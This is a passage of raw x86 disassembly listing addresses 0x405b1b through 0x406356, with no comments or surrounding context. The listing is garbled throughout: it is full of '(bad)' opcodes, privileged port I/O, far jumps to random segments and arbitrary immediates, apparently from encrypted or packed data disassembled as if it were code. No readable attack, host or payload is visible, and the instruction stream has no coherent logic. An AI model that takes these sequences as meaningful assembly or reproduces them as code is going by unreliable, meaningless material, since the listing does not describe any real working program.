  405b1b:	jecxz  0x405ae8
  405b1d:	shr    DWORD PTR [ebx+0x20ffea0f],cl
  405b23:	inc    esi
  405b24:	leave  
  405b25:	je     0x405b20
  405b27:	jg     0x405ab8
  405b29:	dec    ecx
  405b2a:	bound  esp,QWORD PTR [edi]
  405b2c:	sbb    edx,DWORD PTR [edx+0xee89f68]
  405b32:	and    BYTE PTR [ebp+0x51],bl
  405b35:	fstp   TBYTE PTR [ecx]
  405b37:	or     BYTE PTR [ebx+0x3a],cl
  405b3a:	std    
  405b3b:	iret   
  405b3c:	mov    ah,0x9f
  405b3e:	adc    DWORD PTR [ecx],edi
  405b40:	pop    eax
  405b41:	mov    ds:0x99274562,eax
  405b46:	sub    ecx,ebx
  405b48:	outs   dx,DWORD PTR ds:[esi]
  405b49:	pop    edx
  405b4a:	xor    bl,BYTE PTR [esi-0x509ec3bc]
  405b50:	int    0xac
  405b52:	xor    eax,0xd144aa2b
  405b57:	and    DWORD PTR [ecx-0x3de0922e],esi
  405b5d:	sbb    dh,bl
  405b5f:	sbb    BYTE PTR [esi+0x49b5441],bh
  405b65:	mov    edx,0x9cbaa5bd
  405b6a:	mov    dh,0x13
  405b6c:	call   0x690d:0x8d21fe78
  405b73:	sar    DWORD PTR [ecx-0x46f8841f],0x10
  405b7a:	in     eax,0x2b
  405b7c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405b7d:	dec    ecx
  405b7e:	sbb    al,0x60
  405b80:	xchg   edi,eax
  405b81:	inc    ebp
  405b82:	xor    eax,0x563cfae7
  405b87:	adc    esi,0x25905947
  405b8d:	sub    BYTE PTR ds:0xe46f3bf7,0x75
  405b94:	mov    ebp,0xc52bc56
  405b99:	xchg   ah,al
  405b9b:	mov    eax,0x447ce5b9
  405ba0:	in     eax,0x64
  405ba2:	aam    0xce
  405ba4:	(bad)  
  405ba8:	push   eax
  405ba9:	push   0x60
  405bab:	bound  ebx,QWORD PTR [ecx]
  405bad:	pop    es
  405bae:	xor    DWORD PTR [ecx+0x3f],0xffffffcc
  405bb2:	sub    edx,ebx
  405bb4:	iret   
  405bb5:	mov    dh,0x65
  405bb7:	fldcw  WORD PTR [esi-0x3bd58ed2]
  405bbd:	cdq    
  405bbe:	pop    ss
  405bbf:	call   0x132de0df
  405bc4:	adc    eax,0x9c5c4b24
  405bc9:	adc    al,BYTE PTR [eax-0x2b257a85]
  405bcf:	pop    ds
  405bd0:	(bad)  
  405bd1:	js     0x405b83
  405bd3:	clc    
  405bd4:	push   ecx
  405bd5:	outs   dx,DWORD PTR ds:[esi]
  405bd6:	adc    al,0x98
  405bd8:	repnz mov al,0xb7
  405bdb:	lds    esp,FWORD PTR [edx+0x4e]
  405bde:	popa   
  405bdf:	addr16 add ecx,ecx
  405be2:	mov    cl,0x68
  405be4:	mov    bh,BYTE PTR [ebx]
  405be6:	aaa    
  405be7:	jg     0x405b71
  405be9:	jecxz  0x405c41
  405beb:	out    dx,al
  405bec:	retf   
  405bed:	pop    edi
  405bee:	sbb    bh,BYTE PTR [edx-0x3e61968d]
  405bf4:	mov    ch,0x6a
  405bf6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405bf7:	mov    WORD PTR [ebx],es
  405bf9:	adc    BYTE PTR [ebp+0x1b7d4cdc],cl
  405bff:	push   ecx
  405c00:	in     eax,0x80
  405c02:	dec    ecx
  405c03:	pop    ebx
  405c04:	xchg   esp,eax
  405c05:	sub    dh,dl
  405c07:	lock repz pop edx
  405c0a:	push   es
  405c0b:	sti    
  405c0c:	retf   
  405c0d:	hlt    
  405c0e:	mov    eax,ds:0xc8f00019
  405c13:	lock daa 
  405c15:	loopne 0x405c37
  405c17:	fisub  DWORD PTR [ebx-0x29966c94]
  405c1d:	jae    0x405bf3
  405c1f:	push   esi
  405c20:	fnstcw WORD PTR [edx-0x7d]
  405c23:	ret    
  405c24:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405c25:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405c26:	iret   
  405c27:	xchg   BYTE PTR [edi*8-0x4fb8cc3],ch
  405c2e:	xchg   ebp,eax
  405c2f:	and    DWORD PTR [ecx+0x5d196bf1],ebp
  405c35:	push   ebp
  405c36:	inc    edx
  405c37:	aas    
  405c38:	xlat   BYTE PTR ds:[ebx]
  405c39:	mov    WORD PTR [ecx-0x77],ds
  405c3c:	jb     0x405c1c
  405c3e:	and    bh,BYTE PTR [ebp+0x58]
  405c41:	out    dx,eax
  405c42:	je     0x405c33
  405c44:	leave  
  405c45:	fsubr  st(3),st
  405c47:	push   ecx
  405c48:	shl    DWORD PTR [ebp-0x7c],cl
  405c4b:	fcmovb st,st(7)
  405c4d:	addr16 (bad) 
  405c4f:	(bad)  
  405c50:	xor    al,0xcc
  405c52:	fcomp  DWORD PTR ds:0x71f01ecb
  405c58:	xor    ah,BYTE PTR [edi-0x48]
  405c5b:	jmp    0x3accc69d
  405c60:	cmc    
  405c61:	mov    eax,0xc73ecb29
  405c66:	retf   
  405c67:	mov    bh,0xf4
  405c69:	push   esi
  405c6a:	mov    dh,0xe9
  405c6c:	adc    BYTE PTR [edi-0x22118f48],bh
  405c72:	mov    ecx,0x4381389d
  405c77:	add    DWORD PTR [eax-0x51],0xffffffc6
  405c7b:	xchg   BYTE PTR [edx],ah
  405c7d:	fild   QWORD PTR [ecx]
  405c7f:	mov    edi,0xf142e6cd
  405c84:	lods   al,BYTE PTR ds:[esi]
  405c85:	xor    bl,ch
  405c87:	daa    
  405c88:	jno    0x405c41
  405c8a:	clc    
  405c8b:	repnz es pop ss
  405c8e:	or     edi,DWORD PTR [ebx+0x2b]
  405c91:	ins    BYTE PTR es:[edi],dx
  405c92:	pop    esi
  405c93:	out    0x4c,al
  405c95:	pop    ebp
  405c96:	and    eax,0xd4cf272
  405c9b:	push   ebx
  405c9c:	(bad)  
  405c9d:	fsub   DWORD PTR [esi*2+0x13a3b8e2]
  405ca4:	xor    BYTE PTR [eax+0x633f378d],ch
  405caa:	adc    al,0xd4
  405cac:	mov    edi,0x7a8106fd
  405cb1:	add    BYTE PTR [esi+0x6ac46146],cl
  405cb7:	mov    fs,WORD PTR es:[esi]
  405cba:	stos   BYTE PTR es:[edi],al
  405cbb:	add    cl,BYTE PTR [esi+0x55]
  405cbe:	fs jmp 0x2df6e441
  405cc4:	jnp    0x405ce7
  405cc6:	std    
  405cc7:	push   cs
  405cc8:	retf   
  405cc9:	call   0x9104:0x65478a76
  405cd0:	mov    bh,ah
  405cd2:	add    bl,0x5
  405cd5:	sbb    esp,esp
  405cd7:	inc    eax
  405cd8:	jle    0x405c7b
  405cda:	lea    esi,[edi+0x2f721f5c]
  405ce0:	pop    ds
  405ce1:	cmp    eax,DWORD PTR [edi-0x6d]
  405ce4:	pushf  
  405ce5:	xchg   ecx,eax
  405ce6:	mov    eax,ds:0x76bda257
  405ceb:	cmp    edx,edx
  405ced:	xchg   DWORD PTR [ebx+esi*4+0x77],esi
  405cf1:	sbb    eax,DWORD PTR [edx]
  405cf3:	jmp    0x636c:0x7290bc8c
  405cfa:	lods   al,BYTE PTR ds:[esi]
  405cfb:	dec    edx
  405cfc:	xor    ecx,DWORD PTR [ebp-0x5d]
  405cff:	xor    DWORD PTR [ebp+eiz*8-0x6d],eax
  405d03:	loopne 0x405d74
  405d05:	dec    ebp
  405d06:	or     ch,BYTE PTR [edx+edi*2+0x32ef73cc]
  405d0d:	leave  
  405d0e:	mov    DWORD PTR [ebp-0x74],0x6444612b
  405d15:	jmp    0xd409:0x27588e20
  405d1c:	into   
  405d1d:	fiadd  WORD PTR [edx]
  405d1f:	sbb    al,0x78
  405d21:	pusha  
  405d22:	mov    esp,fs
  405d24:	enter  0x62f7,0xd5
  405d28:	and    eax,0xe9fd4152
  405d2d:	out    dx,eax
  405d2e:	pop    ss
  405d2f:	pop    ecx
  405d31:	push   esi
  405d32:	sbb    esp,DWORD PTR [ebp+ecx*4-0x70abf982]
  405d39:	inc    edx
  405d3a:	mov    cl,0x2c
  405d3c:	test   BYTE PTR [esi+0x3813cc45],0xe3
  405d43:	in     al,0x65
  405d45:	outs   dx,BYTE PTR ds:[esi]
  405d46:	inc    esp
  405d47:	cs dec ebx
  405d49:	jmp    0x8503666b
  405d4e:	cli    
  405d4f:	sbb    eax,0xeef55d01
  405d54:	mov    ah,0x4
  405d56:	inc    edi
  405d57:	jne    0x405d32
  405d59:	mov    al,ds:0xf5f59fb3
  405d5e:	mov    ebp,0x29820387
  405d63:	clc    
  405d64:	xor    eax,0x876ea013
  405d69:	outs   dx,DWORD PTR ds:[esi]
  405d6a:	push   esi
  405d6b:	xchg   ebp,eax
  405d6c:	jmp    0x61d7:0xb4b18668
  405d73:	test   al,0x8d
  405d75:	jmp    0x8c1287fc
  405d7a:	and    DWORD PTR [esi+edx*2],ebx
  405d7d:	xor    esi,DWORD PTR [ecx*1+0x69f08c38]
  405d84:	and    al,0x18
  405d86:	push   0x2947f64b
  405d8b:	sbb    ch,BYTE PTR [edi-0x585f39ee]
  405d91:	shl    ch,0x19
  405d94:	xchg   DWORD PTR [eax+0x290746cf],eax
  405d9a:	mov    edx,0xb087582c
  405d9f:	ds int3 
  405da1:	sub    eax,0xcf3c8f0f
  405da6:	mov    dh,0xc2
  405da8:	setle  BYTE PTR [ebx+0x5c6ac967]
  405daf:	mov    BYTE PTR [esi-0x5e],ah
  405db2:	mov    ah,0x2e
  405db4:	sub    al,0xde
  405db6:	sub    BYTE PTR [edi-0x2],dl
  405db9:	or     esi,DWORD PTR [ebx+0x5223d43e]
  405dbf:	in     eax,0xe6
  405dc1:	jp     0x405d70
  405dc3:	loop   0x405d4b
  405dc5:	adc    eax,0x4a9728e3
  405dca:	add    eax,0xc50c1aee
  405dcf:	cmp    eax,0x74e95a9e
  405dd4:	rcr    BYTE PTR [esi],0x83
  405dd7:	sbb    ch,BYTE PTR [edi-0x69c0e8d0]
  405ddd:	ss pop eax
  405ddf:	mov    esi,0x72705663
  405de4:	mov    ds:0xfb8621b0,eax
  405de9:	xlat   BYTE PTR ds:[ebx]
  405dea:	mov    eax,0xc8c70246
  405def:	cmc    
  405df0:	push   edx
  405df1:	sub    BYTE PTR [ecx],cl
  405df3:	pop    eax
  405df4:	sub    BYTE PTR [ebx+0x758fc291],bl
  405dfa:	fild   QWORD PTR [eax]
  405dfc:	arpl   si,di
  405dfe:	sbb    edi,DWORD PTR [edx-0x6e]
  405e01:	jge    0x405dd5
  405e03:	adc    dh,dl
  405e05:	stos   BYTE PTR es:[edi],al
  405e06:	jl     0x405e5d
  405e08:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405e09:	mov    bl,0x9f
  405e0b:	add    al,0xc5
  405e0d:	sub    BYTE PTR [edi+0x32],al
  405e10:	add    eax,0x3fba27cf
  405e15:	(bad)
  405e19:	mov    bl,0x45
  405e1b:	jns    0x405dac
  405e1d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405e1e:	popa   
  405e1f:	pop    ebx
  405e20:	xor    al,0xf6
  405e22:	fldcw  WORD PTR [edx-0x9]
  405e25:	dec    ecx
  405e26:	add    DWORD PTR [edi-0x4a],edx
  405e29:	test   BYTE PTR [ebx+0x27],ah
  405e2c:	inc    ecx
  405e2d:	sahf   
  405e2e:	mov    ebp,0x6eb4e897
  405e33:	dec    ebp
  405e34:	pushf  
  405e35:	jge    0x405dd5
  405e37:	ins    DWORD PTR es:[edi],dx
  405e38:	gs int3 
  405e3a:	ror    DWORD PTR [ecx+0x44429e2d],0x17
  405e41:	push   0xabce006a
  405e46:	push   ds
  405e47:	lds    ebx,FWORD PTR [ecx]
  405e49:	sbb    al,0xa3
  405e4b:	sbb    al,BYTE PTR [edi]
  405e4d:	mov    esi,0x564e56ce
  405e52:	xchg   esp,eax
  405e53:	inc    eax
  405e54:	(bad)  
  405e55:	cmp    al,0x80
  405e57:	xor    esi,DWORD PTR [edx]
  405e59:	das    
  405e5a:	xchg   DWORD PTR [edi+0x2388bb1c],esp
  405e60:	inc    ebp
  405e61:	jnp    0x405ec8
  405e63:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405e64:	mov    edi,0xfb27a33c
  405e69:	xchg   edx,eax
  405e6a:	jae    0x405e6c
  405e6c:	sar    al,1
  405e6e:	dec    edi
  405e6f:	sub    ah,al
  405e71:	cmp    eax,esp
  405e73:	mov    eax,ds:0x9817c999
  405e78:	shl    eax,1
  405e7a:	or     al,0x8c
  405e7c:	(bad)  
  405e7d:	retf   0x3163
  405e80:	push   eax
  405e81:	xchg   ecx,eax
  405e82:	mov    edx,0x703cda43
  405e87:	inc    edi
  405e88:	dec    esi
  405e89:	mov    esp,ecx
  405e8b:	outs   dx,DWORD PTR ds:[esi]
  405e8c:	scas   al,BYTE PTR es:[edi]
  405e8d:	loopne 0x405ebd
  405e8f:	ds aam 0xc7
  405e92:	or     edx,DWORD PTR [edi]
  405e94:	ret    0x7809
  405e97:	and    BYTE PTR [edx+0x3de79d15],0xbc
  405e9e:	or     eax,0x6672cb3c
  405ea3:	ret    
  405ea4:	(bad)  
  405ea5:	stos   DWORD PTR es:[edi],eax
  405ea6:	in     eax,dx
  405ea7:	mov    eax,0x7d79893b
  405eac:	mov    ebx,0xb140913d
  405eb1:	and    al,BYTE PTR [ebp-0x5]
  405eb4:	mov    eax,ds:0x72098fd9
  405eb9:	popf   
  405eba:	pop    ebp
  405ebb:	or     eax,0x787c5b15
  405ec0:	clc    
  405ec1:	in     eax,0xe2
  405ec3:	hlt    
  405ec4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405ec5:	fsubr  DWORD PTR [edi]
  405ec7:	xchg   edi,eax
  405ec8:	mov    BYTE PTR [edi+0x2bec17b0],al
  405ece:	(bad)  
  405ed0:	sub    DWORD PTR ds:0xb2894324,edi
  405ed6:	lds    esi,FWORD PTR [ebp+0x32]
  405ed9:	daa    
  405eda:	xchg   ebp,eax
  405edb:	dec    DWORD PTR [esi+0x435ed9fb]
  405ee1:	aam    0x33
  405ee3:	lods   eax,DWORD PTR ds:[esi]
  405ee4:	inc    edi
  405ee5:	repz adc cl,BYTE PTR [edi]
  405ee8:	fdivr  DWORD PTR [esi+0x7f1780a2]
  405eee:	jl     0x405f5b
  405ef0:	jmp    0xb7ae:0x15bda7
  405ef7:	pop    ebp
  405ef8:	dec    esi
  405ef9:	mov    eax,0x5cb6353b
  405efe:	cmc    
  405eff:	jl     0x405f1f
  405f01:	fisub  WORD PTR [ebp-0x5f]
  405f04:	adc    BYTE PTR [ebp-0x6976205b],0xee
  405f0b:	add    ebx,DWORD PTR ds:0x28546274
  405f11:	xchg   ebp,eax
  405f12:	fild   QWORD PTR [edx-0x17b25e6d]
  405f18:	in     eax,dx
  405f19:	scas   al,BYTE PTR es:[edi]
  405f1a:	and    edi,ebp
  405f1c:	jnp    0x405ed1
  405f1e:	xchg   edi,eax
  405f1f:	mov    ecx,0x9b6cc40d
  405f24:	js     0x405ef6
  405f26:	shl    BYTE PTR [eax+0x65e5d0ce],0xbf
  405f2d:	int3   
  405f2e:	jbe    0x405ec9
  405f30:	sub    DWORD PTR [ecx-0x414a0f50],ebp
  405f36:	rcr    bh,1
  405f38:	ret    
  405f39:	pop    eax
  405f3a:	inc    edi
  405f3b:	repnz adc DWORD PTR [esi-0x54cf5748],esp
  405f42:	loop   0x405efe
  405f44:	pop    edx
  405f45:	addr16 lahf 
  405f47:	imul   ebx,DWORD PTR [edi-0x6f],0x33fa6c47
  405f4e:	add    dh,BYTE PTR [edi-0x507154c9]
  405f54:	lock shr BYTE PTR [edi-0x6e],cl
  405f58:	add    DWORD PTR [edi+0x4ca0f5d0],ecx
  405f5e:	iret   
  405f5f:	cli    
  405f60:	cdq    
  405f61:	cli    
  405f62:	sub    BYTE PTR [edx-0x398009ab],ah
  405f68:	cmp    DWORD PTR [ebx+0x10],ebx
  405f6b:	loop   0x405efb
  405f6d:	lea    eax,[ebx+0x434636a]
  405f73:	sbb    ch,cl
  405f75:	cmp    DWORD PTR [eax-0x44],0x41
  405f79:	and    eax,0xdc8370d7
  405f7e:	dec    ecx
  405f7f:	lods   al,BYTE PTR ds:[esi]
  405f80:	mov    esp,0x38f68fa9
  405f85:	(bad)  
  405f86:	jae    0x405f4c
  405f88:	lock pop ebx
  405f8a:	into   
  405f8b:	and    ebx,DWORD PTR [edi]
  405f8d:	clc    
  405f8e:	xchg   ebp,eax
  405f8f:	loop   0x405fb8
  405f91:	pop    esp
  405f92:	and    al,0x13
  405f94:	out    0x6c,al
  405f96:	push   0x60991baf
  405f9b:	leave  
  405f9c:	scas   eax,DWORD PTR es:[edi]
  405f9d:	or     al,0x89
  405f9f:	push   ds
  405fa0:	in     al,dx
  405fa1:	cwde   
  405fa2:	adc    esp,DWORD PTR [edi-0x67]
  405fa5:	daa    
  405fa6:	call   DWORD PTR [esi+eiz*8+0x78]
  405faa:	dec    eax
  405fab:	pop    ebp
  405fac:	push   esi
  405fad:	fcom   QWORD PTR [ecx-0x71]
  405fb0:	push   0x6248bd0c
  405fb5:	jo     0x40602d
  405fb7:	ret    0x4a39
  405fba:	mov    bl,0xcd
  405fbc:	cwde   
  405fbd:	das    
  405fbe:	xchg   ecx,eax
  405fbf:	pop    ds
  405fc0:	add    BYTE PTR [ebp+0x64b248ec],al
  405fc6:	or     eax,edi
  405fc8:	pop    es
  405fc9:	stos   BYTE PTR es:[edi],al
  405fca:	xor    BYTE PTR [ebx+ebp*1+0x66e0a559],cl
  405fd1:	clc    
  405fd2:	xor    ecx,edi
  405fd4:	out    0xc1,al
  405fd6:	(bad)  
  405fd7:	mov    esi,0x71af1864
  405fdc:	xchg   esp,eax
  405fdd:	ret    
  405fde:	xor    bh,BYTE PTR [ecx+0x6a]
  405fe1:	push   ebx
  405fe2:	pop    edx
  405fe3:	push   0x7a
  405fe5:	xor    DWORD PTR [ebx],0x37
  405fe8:	out    dx,al
  405fe9:	push   es
  405fea:	xor    bh,BYTE PTR ds:0xe0b59646
  405ff0:	fwait
  405ff1:	ds loopne 0x405f87
  405ff4:	les    edx,FWORD PTR [edi+0x4fc22b1e]
  405ffa:	(bad)  
  405ffb:	jmp    0x91c8262d
  406000:	addps  xmm2,XMMWORD PTR [ecx-0x3e]
  406004:	std    
  406005:	div    BYTE PTR ds:[eax]
  406008:	inc    eax
  406009:	add    DWORD PTR [edi+0x643843cd],ebp
  40600f:	mov    bh,0x33
  406011:	aaa    
  406012:	mov    eax,0xf4f02ccc
  406018:	adc    dl,ah
  40601a:	jmp    0x8e288089
  40601f:	mov    eax,DWORD PTR [edx+0xc]
  406022:	sbb    eax,0x3089c73a
  406027:	xor    BYTE PTR [edi],0x1c
  40602a:	cmp    dh,BYTE PTR [ebx+0x544be4c7]
  406030:	dec    edx
  406031:	mov    ds:0x5c5c165c,al
  406036:	mov    eax,ds:0x39cb8b0e
  40603b:	in     al,dx
  40603c:	shl    ebx,0xf
  40603f:	loope  0x40603f
  406041:	fs jl  0x406005
  406044:	and    dh,dl
  406046:	push   0xcf9d9e58
  40604b:	mov    ecx,0xc50cd044
  406050:	and    DWORD PTR [edi+ecx*2-0x16],edi
  406054:	adc    esp,DWORD PTR [ebx]
  406056:	sub    DWORD PTR [edx+0x56c307d4],ebp
  40605c:	adc    esp,esp
  40605e:	pushf  
  40605f:	je     0x40605d
  406061:	mov    esi,0xf9ef3940
  406066:	mov    eax,0x4b6fb8b5
  40606b:	inc    ebx
  40606c:	pusha  
  40606d:	mov    BYTE PTR [esi-0x1a],bh
  406070:	jns    0x406007
  406072:	mov    al,0x1c
  406074:	pop    es
  406075:	xchg   DWORD PTR [edi+0x614891eb],ebp
  40607b:	pop    esp
  40607c:	mov    WORD PTR [edi-0x76831f9d],?
  406082:	sbb    BYTE PTR [edx+esi*1+0x6bf216a],al
  406089:	sub    dl,ah
  40608b:	add    BYTE PTR [edi+0x70],al
  40608e:	stos   BYTE PTR es:[edi],al
  40608f:	ret    0x3f56
  406092:	mov    ds,WORD PTR [eax]
  406094:	std    
  406095:	je     0x406035
  406097:	ss inc edx
  406099:	ja     0x4060a6
  40609b:	push   0xb9fd1fa0
  4060a0:	push   esp
  4060a1:	dec    edi
  4060a2:	dec    ebx
  4060a3:	bsr    ebx,DWORD PTR [edi+edi*4+0x21b8288b]
  4060ab:	imul   eax,DWORD PTR [ebx-0x1a],0x3f408ad3
  4060b2:	ss lahf 
  4060b4:	jg     0x40603f
  4060b6:	call   0x6e0c:0x7d0442e7
  4060bd:	test   eax,0xd4ef7bd3
  4060c2:	push   eax
  4060c3:	inc    esi
  4060c4:	retf   0x8e57
  4060c7:	test   DWORD PTR cs:[edx],ebp
  4060ca:	push   0xbf8ef8d0
  4060cf:	inc    edx
  4060d0:	sahf   
  4060d1:	nop
  4060d2:	out    0x83,al
  4060d4:	data16 fcom QWORD PTR [edi-0x72]
  4060d8:	mov    ecx,0x945b5115
  4060dd:	mov    bl,0x36
  4060df:	dec    eax
  4060e0:	and    ah,BYTE PTR [edi-0x5a16df02]
  4060e6:	push   ebp
  4060e7:	mov    cs,ebx
  4060e9:	xlat   BYTE PTR ds:[ebx]
  4060ea:	(bad)  
  4060eb:	xor    BYTE PTR [esi-0x66461e31],al
  4060f1:	jp     0x4060c5
  4060f3:	xchg   esi,eax
  4060f4:	fucom  st(0)
  4060f6:	xchg   edx,eax
  4060f7:	sub    eax,0x731e8e0e
  4060fc:	aas    
  4060fd:	sub    bl,dh
  4060ff:	ret    
  406100:	stos   BYTE PTR es:[edi],al
  406101:	lods   eax,DWORD PTR ds:[esi]
  406102:	loope  0x406118
  406104:	mov    ds:0x251f49c5,eax
  406109:	shl    BYTE PTR [ecx+0x11],1
  40610c:	call   0x5c9431bc
  406111:	xlat   BYTE PTR ds:[ebx]
  406112:	mov    esp,DWORD PTR [esi+0x48bd1cd5]
  406118:	popf   
  406119:	or     ecx,esp
  40611b:	mov    dl,0xc8
  40611d:	inc    eax
  40611e:	inc    esp
  40611f:	and    ah,BYTE PTR fs:[edx-0x9f4207b]
  406126:	pop    edx
  406127:	(bad)  
  406128:	push   eax
  406129:	mov    WORD PTR [ebx],ss
  40612b:	sti    
  40612c:	sub    eax,0x8cc6c3f7
  406131:	push   0x6731dd34
  406136:	push   edi
  406137:	lods   al,BYTE PTR ds:[esi]
  406138:	call   0x9621:0x72978dbc
  40613f:	ret    
  406140:	les    eax,FWORD PTR [edx+ecx*1+0x30]
  406144:	aam    0x52
  406146:	popf   
  406147:	inc    ecx
  406148:	xlat   BYTE PTR ds:[ebx]
  406149:	mov    cl,0x91
  40614b:	(bad)  
  40614d:	cmp    esi,ebp
  40614f:	lock les ebx,FWORD PTR [esi]
  406152:	or     BYTE PTR [eax],al
  406154:	cmp    ecx,eax
  406156:	add    BYTE PTR ds:0xfbc7b0d8,al
  40615c:	pushf  
  40615d:	sahf   
  40615e:	call   0x728d93ce
  406163:	push   eax
  406164:	enter  0x1007,0xcb
  406168:	mov    bl,0x71
  40616a:	aas    
  40616b:	cmp    DWORD PTR [edx],eax
  40616d:	mov    eax,ds:0x44070602
  406172:	adc    dh,BYTE PTR [ebx+0x92a176e]
  406178:	inc    edx
  406179:	jmp    0x6051:0x3a8d12ca
  406180:	push   ebp
  406181:	icebp  
  406182:	adc    al,BYTE PTR [esi-0x4c295be0]
  406188:	cmp    DWORD PTR [eax+0xd],ebx
  40618b:	shr    BYTE PTR [ecx+0x10813efb],1
  406191:	inc    ebx
  406192:	or     DWORD PTR [esi-0x77eb86a3],eax
  406198:	loope  0x406122
  40619a:	ja     0x40620e
  40619c:	sub    BYTE PTR [eax+0x22],bh
  40619f:	mov    al,ds:0xaab3b3da
  4061a4:	xchg   ebx,eax
  4061a5:	lea    esp,[esp+eiz*8-0x39]
  4061a9:	leave  
  4061aa:	arpl   bx,bp
  4061ac:	fbstp  TBYTE PTR [esi]
  4061ae:	inc    esp
  4061af:	sub    eax,0xf31ea765
  4061b4:	or     ah,BYTE PTR [ebx+0xf017b62]
  4061ba:	xchg   bl,ch
  4061bc:	mov    ecx,0xa5ee4327
  4061c1:	pop    ebp
  4061c2:	fwait
  4061c3:	popf   
  4061c4:	pop    esi
  4061c5:	or     DWORD PTR [ecx],ebp
  4061c7:	xchg   edi,eax
  4061c8:	sub    BYTE PTR [edx],bl
  4061ca:	scas   eax,DWORD PTR es:[edi]
  4061cb:	inc    ebp
  4061cc:	xor    eax,0xbb687923
  4061d1:	shr    DWORD PTR [edi+0xe],0x1c
  4061d5:	bnd jbe 0x40622f
  4061d8:	xor    DWORD PTR [edi-0x11a1f1d6],ebx
  4061de:	sbb    dh,0x9b
  4061e1:	sahf   
  4061e2:	xchg   ebx,eax
  4061e3:	imul   ebp,esp,0x23a56b7e
  4061e9:	sub    dl,dl
  4061eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4061ec:	mov    ebp,0x1ab1747
  4061f1:	mov    ah,0x74
  4061f3:	cmp    al,0x62
  4061f5:	fwait
  4061f6:	in     al,dx
  4061f7:	adc    esp,esp
  4061f9:	mov    eax,?
  4061fb:	iret   
  4061fc:	inc    esp
  4061fd:	imul   eax,DWORD PTR ds:0x89076a77,0xffffff9b
  406204:	imul   ebx,DWORD PTR [ecx+0x6eae159f],0xd7d8bc50
  40620e:	sub    eax,0xa0a6a211
  406213:	in     eax,0xe6
  406215:	sahf   
  406216:	sbb    DWORD PTR [ecx-0x126acf9],ecx
  40621c:	inc    edx
  40621d:	adc    eax,0x8222a273
  406222:	mov    WORD PTR [ebx+0x301581ad],gs
  406228:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  40622a:	sahf   
  40622b:	push   0xd44ef546
  406230:	scas   al,BYTE PTR es:[edi]
  406231:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406232:	aaa    
  406233:	lods   eax,DWORD PTR ds:[esi]
  406234:	pusha  
  406235:	jnp    0x40625f
  406237:	dec    ecx
  406238:	out    0x47,al
  40623a:	xchg   edx,eax
  40623b:	add    dl,0xd1
  40623e:	addr16 call 0xb59d:0x4363ee73
  406246:	js     0xece1c8e1
  40624c:	mov    ecx,ecx
  40624e:	ret    
  40624f:	test   eax,0x2b98a4c0
  406254:	cli    
  406255:	ret    
  406256:	hlt    
  406257:	push   cs
  406258:	sahf   
  406259:	mov    edx,0xbd640793
  40625e:	xor    DWORD PTR [ecx],edi
  406260:	jge    0x40628b
  406262:	loop   0x40622d
  406264:	fld    DWORD PTR [ebx]
  406266:	dec    esp
  406267:	imul   edx,eax,0x2cc298c3
  40626d:	mov    esi,0xcb43f683
  406272:	mov    ?,WORD PTR ds:[edi]
  406275:	popf   
  406276:	sbb    ah,BYTE PTR [ebp-0x19e9f316]
  40627c:	pop    ebx
  40627d:	xchg   edi,eax
  40627e:	enter  0x275e,0xe5
  406282:	lods   eax,DWORD PTR ds:[esi]
  406283:	push   edi
  406284:	mov    edx,0x2748b6c9
  406289:	add    DWORD PTR [ecx-0x6fc4d76b],ebx
  40628f:	outs   dx,DWORD PTR ds:[si]
  406291:	cld    
  406292:	fld    TBYTE PTR [ebx-0x7a]
  406295:	mov    al,ds:0xb3ea23fd
  40629a:	inc    ebp
  40629b:	call   DWORD PTR [ebp+0x62]
  40629e:	aaa    
  40629f:	mov    ah,0xe1
  4062a1:	or     esi,DWORD PTR ds:0x5e0c4088
  4062a7:	bound  ebp,QWORD PTR [esi]
  4062a9:	jmp    0x5c674b86
  4062ae:	or     eax,0x4b3cad0
  4062b3:	mov    edi,0x274f0e8f
  4062b8:	or     al,0x79
  4062ba:	mov    ds:0x67da87c0,al
  4062bf:	out    dx,eax
  4062c0:	aam    0x7f
  4062c2:	jno    0x406258
  4062c4:	ret    
  4062c5:	adc    DWORD PTR [ebx],esp
  4062c7:	adc    DWORD PTR [esp],esi
  4062ca:	jno    0x4062c0
  4062cc:	xor    bh,0x61
  4062cf:	sub    edx,esp
  4062d1:	adc    ebx,esi
  4062d3:	xor    al,0x8a
  4062d5:	jne    0x406316
  4062d7:	stos   DWORD PTR es:[edi],eax
  4062d8:	dec    eax
  4062d9:	pop    ss
  4062da:	aas    
  4062db:	pop    ecx
  4062dc:	sbb    eax,0x3cd9ce0c
  4062e1:	iret   
  4062e2:	inc    esp
  4062e3:	hlt    
  4062e4:	inc    DWORD PTR [esp+eiz*2]
  4062e7:	xor    DWORD PTR [edx+0x7503fae4],eax
  4062ed:	pop    es
  4062ee:	mov    eax,0x3e17d5bb
  4062f3:	adc    DWORD PTR [ebx-0x50edd4cd],edx
  4062f9:	in     al,dx
  4062fa:	aad    0xb7
  4062fc:	fwait
  4062fd:	call   0x35307359
  406302:	into   
  406303:	mov    ds:0xa7c5a702,al
  406308:	(bad)
  40630b:	or     eax,0xe85e947d
  406310:	fild   DWORD PTR [ebx*2+0x55a4b4b9]
  406317:	xor    eax,0x35931133
  40631c:	(bad)  
  40631d:	ds cmc 
  40631f:	jmp    0xba0f5376
  406324:	cli    
  406325:	jecxz  0x40632b
  406327:	xchg   esp,eax
  406328:	cmp    al,0xeb
  40632b:	mov    al,ds:0xd2ba3984
  406330:	pop    ss
  406331:	xchg   ebp,eax
  406332:	mov    esp,0xc698ddc
  406337:	dec    eax
  406338:	rol    BYTE PTR [ecx],0x45
  40633b:	or     dh,BYTE PTR [esi-0x3c114e6]
  406341:	dec    esi
  406342:	int3   
  406343:	and    ch,BYTE PTR [ebx+0x44]
  406346:	jge    0x4063ad
  406348:	icebp  
  406349:	jmp    0x33d5:0xbd204bb5
  406350:	mov    esi,0x91d82e38
  406355:	stos   BYTE PTR es:[edi],al
  406356:	cmp    DWORD PTR [ebp+0x23],0x39
